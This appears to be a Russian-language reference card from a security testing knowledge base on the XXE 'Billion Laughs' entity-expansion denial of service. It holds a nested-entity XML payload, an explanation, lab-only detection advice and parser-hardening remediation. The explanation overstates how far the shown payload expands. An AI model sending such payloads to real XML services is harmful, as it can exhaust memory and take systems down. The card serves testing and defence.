---
id: xxe-param-entity-dos
title: "XXE: Billion Laughs (отказ обслуживания парсера)"
type: xxe
target: xml
category: web
difficulty: beginner
bypass: none
tags: [xxe, dos, entity-expansion]
tested_on: ["libxml2", "Java Xerces", "expat"]
success_rate: 0.9
risk: high
cwe: "CWE-776"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
graph:
  - target: "xxe"
    type: instance_of
  - target: "dos"
    type: leads_to
---

# XXE: Billion Laughs (отказ обслуживания парсера)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY a "xxxxxxxxxx">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<root>&d;</root>
```

## Explanation

Каждый уровень умножает объём в 10 раз: документ в несколько сотен байт
раскрывается в гигабайты строки. Парсер без лимитов исчерпывает память/CPU —
отказ обслуживания без единого запроса к сети. Вариант с внешним ресурсом
(«quadratic blowup», бесконечный поток) работает даже при запрете вложенных сущностей.

## Detection

Отправьте документ с 3–4 уровнями вложенности и измерьте время/потребление памяти
(в лабе!). Резкий рост — парсер уязвим. Не тестируйте на production.

## Remediation

- Запрет DTD (главное).
- Лимиты парсера: `XML_PARSE_HUGE` не включать, `max_entity_expansions`,
  ограничения libxml2 `XML_MAX_TEXT_LENGTH`.
- Лимит размера тела запроса на gateway (например, 1 МБ для XML-API).
- Таймауты и memory limits для воркеров; изоляция парсинга в отдельный процесс.
